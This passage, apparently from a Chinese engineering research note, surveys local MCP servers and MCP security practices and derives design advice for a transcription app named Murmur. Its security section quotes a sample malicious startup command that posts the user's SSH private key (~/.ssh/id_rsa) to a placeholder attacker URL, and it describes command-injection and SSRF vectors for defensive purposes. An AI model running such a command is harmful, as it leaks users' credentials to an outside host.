| **Chrome DevTools MCP**（ChromeDevTools，~51.1k★） | puppeteer 驱动；**首个工具调用时自动启动 Chrome**，也可连接运行中的实例（Advanced Usage）。共 **57 个工具**                                                                                                                                                            | `click`、`fill`、`fill_form`、`navigate_page`、`new_page`、`take_snapshot`（a11y 树）、`take_screenshot`、`evaluate_script`、`list_console_messages`、`performance_start_trace/stop_trace`、13 个 heap snapshot 系列、扩展管理/PWA 等（部分需 flag 开启）                                   | <https://github.com/ChromeDevTools/chrome-devtools-mcp>、`docs/tool-reference.md`                                                                                   |
| **Figma MCP server**（官方）                       | 两种运行形态：**远程** `https://mcp.figma.com/mcp`（推荐，所有 plan）；**桌面 app 本地 server**（付费 Dev/Full seat；_"Selection-based prompting only works with the desktop MCP server"_——本地桥接换来的独有能力）。agent 用 "Copy link to selection" 的 URL 定位节点 | 读：`get_design_context`、`get_metadata`、`get_screenshot`、`download_assets`、`get_variable_defs`、`get_motion_context`、`get_figjam`、`whoami` 等；写：`use_figma`、`generate_figma_design`、`create_new_file`、`upload_assets`、`generate_diagram`；prompt：`create_design_system_rules` | <https://help.figma.com/hc/en-us/articles/32132100833559-Guide-to-the-Dev-Mode-MCP-Server>、<https://developers.figma.com/docs/figma-mcp-server/tools-and-prompts/> |
| **Serena**（oraios，~28.9k★）                      | 不是桥接桌面 app，而是独立 MCP server 内嵌 LSP（40+ 语言）。`uv tool install -p 3.13 serena-agent` + `serena init`；stdio 或 HTTP 模式。重要纪律：与宿主 agent 重复的基础工具（`execute_shell_command`、`read_file` 等）_"typically disabled by default"_              | `find_symbol`、symbol overview、find referencing symbols、`replace_symbol_body`、insert after/before symbol、safe delete、`search_for_pattern`、memory 系统                                                                                                                                 | <https://github.com/oraios/serena>                                                                                                                                  |

模式归纳：**(a) server 自起目标进程**（Playwright 默认、Chrome DevTools auto-launch）；**(b) 附加到已运行实例**（Playwright `--extension`/`--cdp-endpoint`、Chrome DevTools 连接运行中 Chrome）；**(c) 桌面应用自带 MCP server**（Figma 桌面 server、superwhisper `mcp` 子命令）。三者都以 stdio/npx 一行配置接入客户端。

---

## 6. 本地 MCP server 的安全要点

来源（除单独标注外）：<https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices>

### 6.1 stdio 信任模型

- 本地 MCP server 以**与 MCP 客户端相同的用户权限**运行，是攻击者的高价值目标（arbitrary code execution、数据外泄、数据丢失）。支持一键配置本地 server 的客户端 **MUST** 在执行前完整展示将执行的命令（不截断）、明示这是在本机执行代码的危险操作、并获得用户明确批准。
- 官方对本地 server 作者的直接建议：**"Use the `stdio` transport to limit access to just the MCP client"**；若改用 HTTP 传输则必须加鉴权 token，或用 Unix domain socket / IPC 限制访问。
- 客户端侧配套：VS Code 首次启动信任确认 + 沙箱（<https://code.visualstudio.com/docs/copilot/customization/mcp-servers>）；Claude Code project scope 首用需批准（<https://code.claude.com/docs/en/mcp>）。

### 6.2 命令注入与"工具描述被当作注入面"

- **规范层面**：工具行为描述与 annotations 一律视为不可信——_"descriptions of tool behavior such as annotations should be considered untrusted, unless obtained from a trusted server"_（<https://modelcontextprotocol.io/specification/2026-07-28>，Security and Trust & Safety 原则）。annotations 博文进一步说明：hints 无法让模型抵抗 prompt injection，硬保证 _"a job for network controls or sandboxing, not a boolean hint"_（<https://blog.modelcontextprotocol.io/posts/2026-03-16-tool-annotations/>）。
- **Servers MUST**：validate all tool inputs / implement access controls / rate limit tool invocations / sanitize tool outputs。**Clients SHOULD**：敏感操作确认、调用前向用户展示工具输入（防恶意/意外的数据外泄）、校验结果、超时、审计日志（<https://modelcontextprotocol.io/specification/2026-07-28/server/tools#security-considerations>）。
- **命令注入具体向量**（安全文档 "OAuth Authorization URL Validation" 与 "stdio Transport Security in Proxy Scenarios" 节）：恶意 server 给出 `javascript:` 或含 shell 元字符的授权 URL，可经客户端 XSS/shell 执行升级为 RCE；在"代理服务管理 stdio 子进程"的架构下可进一步放大——缓解包括 URL scheme 白名单（仅 http/https）、**禁止用 shell 打开 URL**、CSP、对 spawn 的进程做文件系统/网络限制。本地 server 场景的典型恶意启动命令示例（文档原文）：`npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location`。
- 其他已列攻击面（远程场景为主，供参考）：Confused Deputy（代理 server 必须做 per-client consent）、Token Passthrough（**MUST NOT** 接受非发给本 server 的 token）、SSRF（OAuth 发现 URL 可指向内网/云元数据）、State Handle Hijacking（**handle 不是认证**——对无认证 server，handle 必须高熵+有期限+过期返回明确错误）、scope 最小化。

### 6.3 路径校验与日志

- 官方 Filesystem 参考实现的定位是 _"Secure file operations with configurable access controls"_（目录白名单模式）（<https://github.com/modelcontextprotocol/servers>）；Claude Desktop 文档要求配置中的文件路径必须是绝对路径（<https://modelcontextprotocol.io/docs/2026-07-28/develop/connect-local-servers>）。
- **stdio server 的 stdout 是协议通道**：日志必须写 stderr——2025-11-25 changelog 明确 _"servers using stdio transport may use stderr for all types of logging"_；Claude Desktop 会把各 server 的 stderr 收进 `mcp-server-*.log`（<https://modelcontextprotocol.io/specification/2025-11-25/changelog>、<https://modelcontextprotocol.io/docs/2026-07-28/develop/connect-local-servers>）。
- 敏感参数不应标 `x-mcp-header`（会暴露给网络中间件）；secrets 建议经环境变量注入而非写进工具参数（各客户端配置均支持 `env` 字段与变量展开）。

---

## 7. 对 Murmur 的直接启示

以下均直接由上述调研事实推导。

1. **起步形态：官方 TS SDK v1（`@modelcontextprotocol/sdk` 1.30.0）+ stdio**。Murmur 是 Electron + Node 22+，v1 单包无拆包迁移成本；官方承诺 v2 发布后至少 6 个月维护（v2.0.0 发布于 2026-07-28，窗口覆盖到至少 2027-01）；规范有正式的跨版本向后兼容矩阵，按 2025-11-25 年代实现的 stdio server 在现行客户端下仍工作。API（`McpServer`/`registerTool`/`StdioServerTransport`）在 v2 保持同形，后续迁移主要是包名/import 变更。
2. **CLI 与 MCP 共用同一实现，CLI 先行或同步交付**。superwhisper（`superwhisper mcp` 子命令）、Playwright（README 建议 coding agent 用 CLI 省 token）、Chrome DevTools MCP、MacWhisper（Pro 卖点就是 CLI）都验证了这一形态。Murmur 可做 `murmur mcp`（启动 stdio server）+ `murmur transcribe <file>` 等子命令，共享同一服务层。
3. **工具面：少量、动词开头 snake*case、带 `murmur*` 前缀**。前缀的依据是规范明确 server 名不保证唯一、聚合客户端可能重名。建议的初版工具集（对应 Murmur 现有能力）：
   - `murmur_transcribe_file`（文件转写，参数走绝对路径，返回 transcript + speakers + 段落）
   - `murmur_search_history`（FTS5 全文检索，readOnlyHint: true）
   - `murmur_get_transcript` / `murmur_export_transcript`（按历史记录 id 取全文 / 导出 TXT/SRT/MD/DOCX）
   - `murmur_start_dictation` / `murmur_stop_dictation`（按住说话的开关，若桥接 GUI 实例）
     命名示例参考 Anthropic 博客的 `search_contacts` / `schedule_event` 风格；数量控制在"a few thoughtful tools"。
4. **返回与错误**：定义 `outputSchema` 并同时返回 `structuredContent` 与 TextContent JSON（规范向后兼容要求）；转写文本较长，注意 Claude Code 25,000 token 输出上限——搜索/列表工具返回摘要 + id，全文用单独工具按需取（官方"concise/detailed + 分页截断"模式）。路径非法、文件不存在等用户可纠正的错误用 `isError: true` 并写明可行动的修正信息（SEP-1303 + Anthropic 错误信息指南）。Murmur 的 `audioPathValidator`（绝对路径、拒 UNC）正好作为工具入参校验层。
5. **长任务（文件转写）**：Tasks 已移入可选扩展，不宜依赖。按规范 "Stateful Tools" 指南：`murmur_transcribe_file` 立即返回 job handle（高熵、含过期语义），配 `murmur_get_job_status` 轮询——与 Murmur 现有异步转写管线天然对齐。
6. **安全基线**：仅 stdio（官方本地暴露建议）；stdout 只走协议、日志进 stderr；API key 等秘密经 env 而非工具参数；工具描述里不含任何会被当指令执行的自然语言；路径一律绝对路径并过白名单校验。MCP server 读 `{userData}/murmur.json` 配置时沿用 ADR-004 白名单机制；若新增 MCP 相关设置键，须同步 `SettingsState` + `DEFAULT_SETTINGS` + load/save builder + `ALLOWED_SETTING_KEYS` 四处 + 白名单键（仓库 AGENTS.md Prohibited #5）。
7. **生态位**：本地 whisper 类 MCP server 全是英文社区项目；中文优先（FunASR Paraformer）+ 说话人分离 + FTS5 历史检索的本地 MCP server 目前没有发现同类（见 5.2 空白点）。superwhisper/WisprFlow 证明了"语音数据暴露给 agent"的真实需求，但两者都不做本地文件转写——Murmur 的差异化明确。
8. **文档交付物**：MCP/CLI 上线时按客户端分别给配置片段——Claude Code（`claude mcp add murmur -- murmur mcp` 或项目 `.mcp.json` 的 `mcpServers`）、Cursor（`.cursor/mcp.json` 的 `mcpServers`）、VS Code（`.vscode/mcp.json` 的 `servers`）。可参照 superwhisper 让 `murmur mcp` 在无参数时打印这些配置片段。

---

## 附：未验证事项清单

- jwulff/whisper-mcp、eviscerations/whisper-windows-mcp 的 README 细节未逐一核验（仅定位到仓库/目录页）。
- MCP Registry（registry.modelcontextprotocol.io）中是否存在中文转写类 server 未逐一检索。
- WisprFlow 是否有官方 CLI：未在官方文档中发现，未进一步验证。
- 2026-07-28 spec 的 `server/discover`、subscriptions 等新机制的细节仅依据发布公告与 spec 页面概述，未逐节核对全部子页。
